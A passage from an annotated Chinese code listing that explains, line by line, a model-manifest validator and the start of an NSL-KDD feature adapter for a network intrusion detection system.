| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ap = os.path.join(version_dir, cand)` |
| 92 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.isfile(ap):` |
| 93 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 94 | 循环：逐个处理集合或迭代器中的元素。 | `        for rel in arts.values():` |
| 95 | 条件判断：满足条件时进入对应分支。 | `            if not isinstance(rel, str) or not rel:` |
| 96 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 97 | 条件判断：满足条件时进入对应分支。 | `            if os.path.basename(rel) == cand and os.path.isfile(` |
| 98 | 函数调用：执行已有函数/方法完成当前步骤。 | `                os.path.normpath(os.path.join(version_dir, rel))` |
| 99 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ):` |
| 100 | 返回结果：把处理后的值交回调用方。 | `                return cand` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 抛出异常：主动报告不可继续的错误。 | `    raise ManifestLoadError(` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "版本目录 manifest 无法解析主 artifact；请在 manifest.json 增加 "` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "\"primary_artifact\": \"model.pkl\" 或在 artifact_files 中声明 model/pipeline"` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 108 | 函数定义：声明 `load_manifest_from_version_dir` 的输入、处理逻辑和返回结果。 | `def load_manifest_from_version_dir(version_dir: str) -> tuple[str, ModelManifest]:` |
| 109 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `    从 \`\`<version_dir>/manifest.json\`\` 加载并校验，返回 \`\`(主模型绝对路径, ModelManifest)\`\`。` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 代码语句：参与当前文件的业务流程或数据处理。 | `    目录布局示例：\`\`models/saved/ddos/v1/manifest.json\`\` + \`\`model.pkl\`\`。` |
| 113 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    vd = os.path.abspath(version_dir)` |
| 115 | 条件判断：满足条件时进入对应分支。 | `    if not os.path.isdir(vd):` |
| 116 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"版本目录不存在: {vd}")` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mpath = os.path.join(vd, VERSION_MANIFEST_NAME)` |
| 118 | 条件判断：满足条件时进入对应分支。 | `    if not os.path.isfile(mpath):` |
| 119 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"缺少 {VERSION_MANIFEST_NAME}: {mpath}")` |
| 120 | 上下文管理：自动管理资源打开与释放。 | `    with open(mpath, encoding="utf-8") as f:` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        data = json.load(f)` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    base = _infer_primary_artifact_basename(data, vd)` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_path = os.path.join(vd, base)` |
| 124 | 条件判断：满足条件时进入对应分支。 | `    if not os.path.isfile(model_path):` |
| 125 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"主模型文件不存在: {model_path}")` |
| 126 | 返回结果：把处理后的值交回调用方。 | `    return model_path, validate_manifest_dict(` |
| 127 | 代码语句：参与当前文件的业务流程或数据处理。 | `        data, model_path=model_path, manifest_path=mpath` |
| 128 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 129 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 131 | 函数定义：声明 `resolve_model_entry` 的输入、处理逻辑和返回结果。 | `def resolve_model_entry(model_path: str) -> tuple[str, ModelManifest]:` |
| 132 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 133 | 代码语句：参与当前文件的业务流程或数据处理。 | `    统一入口：\`\`model_path\`\` 为 \`\`.pkl\`\` 文件（旧式，同目录 \`\`*.model_manifest.json\`\`）` |
| 134 | 代码语句：参与当前文件的业务流程或数据处理。 | `    或为版本目录（内含 \`\`manifest.json\`\`）。` |
| 135 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 136 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ap = os.path.abspath(model_path)` |
| 137 | 条件判断：满足条件时进入对应分支。 | `    if os.path.isdir(ap):` |
| 138 | 返回结果：把处理后的值交回调用方。 | `        return load_manifest_from_version_dir(ap)` |
| 139 | 条件判断：满足条件时进入对应分支。 | `    if not os.path.isfile(ap):` |
| 140 | 抛出异常：主动报告不可继续的错误。 | `        raise FileNotFoundError(ap)` |
| 141 | 返回结果：把处理后的值交回调用方。 | `    return ap, load_manifest_for_model_path(ap)` |
| 142 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 143 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 144 | 函数定义：声明 `validate_manifest_dict` 的输入、处理逻辑和返回结果。 | `def validate_manifest_dict(` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    data: Mapping[str, Any],` |
| 146 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_path: str,` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    manifest_path: str,` |
| 149 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> ModelManifest:` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    missing = [k for k in REQUIRED_MANIFEST_KEYS if k not in data]` |
| 151 | 条件判断：满足条件时进入对应分支。 | `    if missing:` |
| 152 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"manifest 缺键: {missing} ({manifest_path})")` |
| 153 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    fc = data["feature_columns"]` |
| 155 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(fc, list) or not fc:` |
| 156 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError("feature_columns 必须为非空 list")` |
| 157 | 条件判断：满足条件时进入对应分支。 | `    if not all(isinstance(x, str) and x for x in fc):` |
| 158 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError("feature_columns 必须全为非空字符串")` |
| 159 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    artifacts = data["artifact_files"]` |
| 161 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(artifacts, dict) or not artifacts:` |
| 162 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError("artifact_files 必须为非空 object")` |
| 163 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    trust = str(data.get("trust_tier", "production"))` |
| 165 | 条件判断：满足条件时进入对应分支。 | `    if trust not in ALLOWED_TRUST_TIERS:` |
| 166 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"非法 trust_tier: {trust}")` |
| 167 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mode = str(data.get("model_input_mode", "tabular"))` |
| 169 | 条件判断：满足条件时进入对应分支。 | `    if mode not in ALLOWED_INPUT_MODES:` |
| 170 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"非法 model_input_mode: {mode}")` |
| 171 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    metrics = data["metrics"]` |
| 173 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(metrics, dict):` |
| 174 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError("metrics 必须为 object")` |
| 175 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_dir = os.path.dirname(os.path.abspath(model_path))` |
| 177 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_base = os.path.basename(model_path)` |
| 178 | 注释：解释下面或当前这段代码的设计意图。 | `    # 主权重文件必须在 artifact_files 中显式声明且 basename 一致` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    primary = None` |
| 180 | 循环：逐个处理集合或迭代器中的元素。 | `    for _k, rel in artifacts.items():` |
| 181 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(rel, str) or not rel:` |
| 182 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 183 | 条件判断：满足条件时进入对应分支。 | `        if os.path.basename(rel) == model_base:` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            primary = rel` |
| 185 | 跳出循环：提前结束当前循环。 | `            break` |
| 186 | 条件判断：满足条件时进入对应分支。 | `    if primary is None:` |
| 187 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(` |
| 188 | 代码语句：参与当前文件的业务流程或数据处理。 | `            f"artifact_files 必须包含指向主模型文件的条目（basename={model_base!r}）"` |
| 189 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    abs_primary = os.path.normpath(os.path.join(model_dir, primary))` |
| 191 | 条件判断：满足条件时进入对应分支。 | `    if not os.path.isfile(abs_primary):` |
| 192 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"artifact 主文件路径无效: {abs_primary}")` |
| 193 | 条件判断：满足条件时进入对应分支。 | `    if os.path.abspath(abs_primary) != os.path.abspath(model_path):` |
| 194 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"manifest 主模型路径与 load_model 参数不一致: {abs_primary} != {model_path}"` |
| 196 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 197 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 198 | 循环：逐个处理集合或迭代器中的元素。 | `    for key, rel in artifacts.items():` |
| 199 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(rel, str) or not rel:` |
| 200 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(f"artifact_files[{key!r}] 非法")` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ap = os.path.normpath(os.path.join(model_dir, rel))` |
| 202 | 条件判断：满足条件时进入对应分支。 | `        if rel.endswith(("/", "\\")) or os.path.isdir(ap):` |
| 203 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 204 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.isfile(ap):` |
| 205 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(f"artifact 不存在: {key} -> {ap}")` |
| 206 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    m = ModelManifest(` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_name=str(data["model_name"]),` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        version=str(data["version"]),` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schema_name=str(data["schema_name"]),` |
| 211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schema_version=str(data["schema_version"]),` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feature_columns=list(fc),` |
| 213 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        training_dataset=str(data["training_dataset"]),` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        metrics=dict(metrics),` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        created_at=str(data["created_at"]),` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        artifact_files={str(k): str(v) for k, v in artifacts.items()},` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        trust_tier=trust,` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        adapter=(None if data.get("adapter") in (None, "") else str(data["adapter"])),` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_input_mode=mode,` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw=dict(data),` |
| 221 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 222 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 223 | 条件判断：满足条件时进入对应分支。 | `    if m.schema_name not in {` |
| 224 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "network_flow_v1",` |
| 225 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "web_request_v1",` |
| 226 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "system_behavior_v1",` |
| 227 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "ioc_match_v1",` |
| 228 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }:` |
| 229 | 抛出异常：主动报告不可继续的错误。 | `        raise ManifestLoadError(f"未知 schema_name: {m.schema_name}")` |
| 230 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 231 | 条件判断：满足条件时进入对应分支。 | `    if m.trust_tier == "production" and m.model_input_mode == "tabular":` |
| 232 | 导入对象：从指定模块引入类、函数或常量。 | `        from .nsl_kdd_adapter import NSL_KDD_FEATURE_COLUMNS` |
| 233 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 234 | 条件判断：满足条件时进入对应分支。 | `        if set(m.feature_columns) == set(NSL_KDD_FEATURE_COLUMNS):` |
| 235 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(` |
| 236 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "feature_columns 为 NSL-KDD 41 维但 trust_tier=production。"` |
| 237 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "NSL-KDD 与在线 network_flow_v1 不对齐，请将 trust_tier 设为 "` |
| 238 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "'prototype_nsl_kdd' 并设置 adapter='nsl_kdd_v1'，或改用生产 schema 重训。"` |
| 239 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 240 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 241 | 条件判断：满足条件时进入对应分支。 | `    if m.trust_tier == "prototype_nsl_kdd":` |
| 242 | 导入对象：从指定模块引入类、函数或常量。 | `        from .nsl_kdd_adapter import NSL_KDD_FEATURE_COLUMNS` |
| 243 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 244 | 条件判断：满足条件时进入对应分支。 | `        if set(m.feature_columns) != set(NSL_KDD_FEATURE_COLUMNS):` |
| 245 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(` |
| 246 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "prototype_nsl_kdd 要求 feature_columns 与 NSL-KDD 41 维集合一致"` |
| 247 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 248 | 条件判断：满足条件时进入对应分支。 | `        if len(m.feature_columns) != len(NSL_KDD_FEATURE_COLUMNS):` |
| 249 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(` |
| 250 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "prototype_nsl_kdd 要求 feature_columns 长度等于 41"` |
| 251 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 252 | 条件判断：满足条件时进入对应分支。 | `        if m.adapter != "nsl_kdd_v1":` |
| 253 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError("prototype_nsl_kdd 必须 adapter=nsl_kdd_v1")` |
| 254 | 条件判断：满足条件时进入对应分支。 | `        if m.schema_name != "network_flow_v1":` |
| 255 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(` |
| 256 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "prototype_nsl_kdd 期望 schema_name=network_flow_v1（在线流入口契约）"` |
| 257 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 258 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 259 | 返回结果：把处理后的值交回调用方。 | `    return m` |

## `src/schema/nsl_kdd_adapter.py`

- 类型：数据结构/Schema
- 行数：177

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `NSL-KDD 41 维与在线 \`\`network_flow_v1\`\` 的显式适配（仅原型可信边界）。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `可映射字段从在线流统计推导；不可映射字段不得在无审计时当作生产可信输入。` |
| 5 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 6 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, List, Mapping, Sequence, Tuple` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from .feature_schemas import _flatten_network_flow_features` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `NSL_KDD_FEATURE_COLUMNS: List[str] = [` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "duration",` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "protocol_type",` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "service",` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "flag",` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "src_bytes",` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_bytes",` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "land",` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "wrong_fragment",` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "urgent",` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "hot",` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "num_failed_logins",` |
| 24 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "logged_in",` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "num_compromised",` |
| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "root_shell",` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "su_attempted",` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "num_root",` |
| 29 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "num_file_creations",` |
| 30 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "num_shells",` |
| 31 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "num_access_files",` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "num_outbound_cmds",` |
| 33 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "is_host_login",` |
| 34 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "is_guest_login",` |
| 35 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "count",` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "srv_count",` |
| 37 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "serror_rate",` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "srv_serror_rate",` |
| 39 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "rerror_rate",` |
| 40 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "srv_rerror_rate",` |
| 41 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "same_srv_rate",` |
| 42 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "diff_srv_rate",` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "srv_diff_host_rate",` |
| 44 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_count",` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_srv_count",` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_same_srv_rate",` |
| 47 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_diff_srv_rate",` |
| 48 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_same_src_port_rate",` |
| 49 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_srv_diff_host_rate",` |
| 50 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_serror_rate",` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_srv_serror_rate",` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_rerror_rate",` |
| 53 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "dst_host_srv_rerror_rate",` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `]` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 注释：解释下面或当前这段代码的设计意图。 | `# NSL 列名 -> 在线 network_flow_v1 字段名（语义为近似/代理，非 KDD 原始定义）` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_MAPPABLE_FROM_FLOW: Dict[str, str] = {` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "duration": "flow_duration",` |
| 60 | 注释：解释下面或当前这段代码的设计意图。 | `    # 单向流总字节近似到 src_bytes；dst_bytes 无独立观测` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "src_bytes": "flow_byte_count",` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "count": "flow_pkt_count",` |
| 63 | 注释：解释下面或当前这段代码的设计意图。 | `    # 窗口内不同目的端口数，作为 srv_count 的弱代理（验收见文档）` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "srv_count": "window_unique_dst_port",` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 注释：解释下面或当前这段代码的设计意图。 | `# 显式常量映射（无在线字段，原型下填 0 并审计）` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_CONSTANT_ZERO: Dict[str, float] = {` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "land": 0.0,` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "wrong_fragment": 0.0,` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "urgent": 0.0,` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "hot": 0.0,` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "num_failed_logins": 0.0,` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "logged_in": 0.0,` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "num_compromised": 0.0,` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "root_shell": 0.0,` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "su_attempted": 0.0,` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "num_root": 0.0,` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "num_file_creations": 0.0,` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "num_shells": 0.0,` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "num_access_files": 0.0,` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "num_outbound_cmds": 0.0,` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "is_host_login": 0.0,` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "is_guest_login": 0.0,` |
| 85 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 注释：解释下面或当前这段代码的设计意图。 | `# 训练期 factorize 的类别列：在线无编码表，原型默认 0 并审计` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_CATEGORICAL_NSL_NO_ONLINE_ENCODING = frozenset({"protocol_type", "service", "flag"})` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 注释：解释下面或当前这段代码的设计意图。 | `# 其余数值列：无可靠在线对应时以 0 填充并审计（KDD 主机统计等）` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_UNMAPPED_NUMERIC = [` |
| 92 | 代码语句：参与当前文件的业务流程或数据处理。 | `    c` |
| 93 | 循环：逐个处理集合或迭代器中的元素。 | `    for c in NSL_KDD_FEATURE_COLUMNS` |
| 94 | 条件判断：满足条件时进入对应分支。 | `    if c not in _MAPPABLE_FROM_FLOW` |
| 95 | 代码语句：参与当前文件的业务流程或数据处理。 | `    and c not in _CONSTANT_ZERO` |
| 96 | 代码语句：参与当前文件的业务流程或数据处理。 | `    and c not in _CATEGORICAL_NSL_NO_ONLINE_ENCODING` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `]` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 类定义：声明 `NSLKDDAdapter`，封装相关状态与行为。 | `class NSLKDDAdapter:` |
| 101 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 102 | 代码语句：参与当前文件的业务流程或数据处理。 | `    将 \`\`network_flow_v1\`\` 扁平特征映射为 NSL-KDD 顺序向量。` |
| 103 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 104 | 代码语句：参与当前文件的业务流程或数据处理。 | `    \`\`mappable_fields\`\` / \`\`unmapped_fields\`\` 用于验收与审计日志。` |
| 105 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    MAPPABLE_FIELDS: Dict[str, str] = dict(_MAPPABLE_FROM_FLOW)` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    UNMAPPED_FIELDS: List[str] = sorted(` |
| 109 | 函数调用：执行已有函数/方法完成当前步骤。 | `        frozenset(_CONSTANT_ZERO) \| _CATEGORICAL_NSL_NO_ONLINE_ENCODING \| frozenset(_UNMAPPED_NUMERIC)` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 装饰器：为下面的函数或类附加框架行为。 | `    @classmethod` |
| 113 | 函数定义：声明 `describe` 的输入、处理逻辑和返回结果。 | `    def describe(cls) -> Dict[str, Any]:` |
| 114 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "mappable_nsl_to_flow": dict(_MAPPABLE_FROM_FLOW),` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "constant_zero": list(_CONSTANT_ZERO.keys()),` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "categorical_zero_without_encoding": sorted(_CATEGORICAL_NSL_NO_ONLINE_ENCODING),` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "unmapped_numeric_zero": _UNMAPPED_NUMERIC,` |
| 119 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 120 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 121 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 122 | 函数定义：声明 `_float` 的输入、处理逻辑和返回结果。 | `    def _float(x: Any) -> float:` |
| 123 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 124 | 条件判断：满足条件时进入对应分支。 | `            if x is None:` |
